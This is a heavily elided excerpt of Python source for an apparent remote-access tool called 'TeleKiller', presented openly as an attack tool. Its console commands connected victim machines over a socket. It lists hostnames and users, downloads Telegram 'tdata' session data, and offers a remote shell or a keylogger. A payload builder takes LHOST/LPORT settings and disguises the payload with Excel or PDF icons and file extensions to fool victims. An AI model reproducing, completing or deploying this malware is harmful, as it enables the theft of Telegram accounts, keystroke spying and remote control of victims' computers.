            ...
            while True:
                ...
                try:
                    if cmd[0:3] == "cd " and len(cmd) > 3:
                        ...
                        cmd.upper()[0] in list_drive and cmd[1] == ":" and len(cmd) == 2
                    ):
                        client.send(cmd)
                        time.sleep(1)
                        res = client.recv(10240)
...
while True:
    try:
        cmd = input(
            Fore.MAGENTA + "UltraSec@TeleKiller\x1b[37m:\x1b[34m~\x1b[37m#\x1b[0m "
        )
    except:
        banner()
    if cmd == "3":
                ...
                try:
                    ...
                    try:
                        ...
                        try:
                            ...
                            print(
                                Fore.BLUE
                                + "[*]\x1b[37mHostname (%s)\x1b[0m" % (hostname)
                            )
                            print(
                                Fore.BLUE + "[*]\x1b[37mOS name (%s)\x1b[0m" % (os_name)
                            )
                            print(Fore.WHITE + "\nID\tUser List\n===\t=========")
                            ...
                            while True:
                                try:
                                    select_user = input(Fore.CYAN + "SELECT> ")
                                except:
                                    pass
                                if select_user == "99":
                                    try:
                            ...
                            if licen_download_tdata == "yes":
                                ...
                                if rd == False:
                                    ...
                                    print(
                                        Fore.CYAN + "Save -> downloads/" + random_name
                                    )
                                print(Fore.GREEN + "\n=============================\n")
                                f.close()
                            print()
                            if csf == False and rd == None:
                                while True:
                                    try:
                                        qks = input(
                                            "You Can Access Shell Or Keylogger?[y/n]"
                                        )
                                    except:
                                        pass
        ...
        print()
        lhost = input(Fore.GREEN + "LHOST-> ")
        if lhost == "":
            lhost = socket.gethostbyname(socket.gethostname())
            print(Fore.RED + "\nDefault LHOST : " + lhost + "\n")
        else:
            print(Fore.RED + "\nLHOST : " + lhost + "\n")
        lport = input(Fore.GREEN + "LPORT-> ")
        if lport == "":
            lport = 4444
            print(Fore.RED + "\nDefault LPORT : 4444\n")
        else:
            print(Fore.RED + "\nLPORT : " + lport + "\n")
        payload_name = input(Fore.GREEN + "NAME-> ")
        if payload_name == "":
        ...
        icon_path = input(Fore.GREEN + "Enter Path Icon(Just *.ico)-> ")
        format_outf = ""
        licen_ico = False
        if icon_path == "":
            key_icon = {
                "0": ["icons\\excel.ico", ".xlsx"],
                "1": ["icons\\pdf.ico", ".pdf"],
            ...
            for sii in range(0, 5):
                print(
                    "{}[{}]\t{}{}".format(
                        ...
                        sii,
                        Fore.CYAN,
                        key_icon[str(sii)][0].replace("icons\\", ""),
                    )
                )
            print()
            icon_select = input(Fore.GREEN + "SELECT> ")
